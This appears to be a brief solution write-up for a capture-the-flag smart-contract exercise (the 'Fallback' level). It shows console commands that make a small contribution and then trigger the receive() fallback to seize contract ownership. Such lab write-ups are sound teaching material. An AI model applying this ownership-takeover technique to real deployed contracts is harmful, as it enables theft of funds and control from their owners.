Can either gain ownership through contribute() function, in which case we require over 100Ether (takes too long).
Or we can gain ownership by exploiting the Fallback function recieve(), which runs upon funds entering the contract without calldata.

Check who is owner.
`contract.owner()`

We need to be a contributer. So we send less than 0.001 eth to contribute function.
`contract.contribute({value: web3.toWei('0.0009')})`

Check we are a contributer.
`contract.getContribution().then(v=>v.toString())`

Now we just need to trigger the recieve() fallback.
`contract.sendTransaction({value: web3.toWei('0.0001')})`

Check we are now owner.
`contract.owner()`
`player`
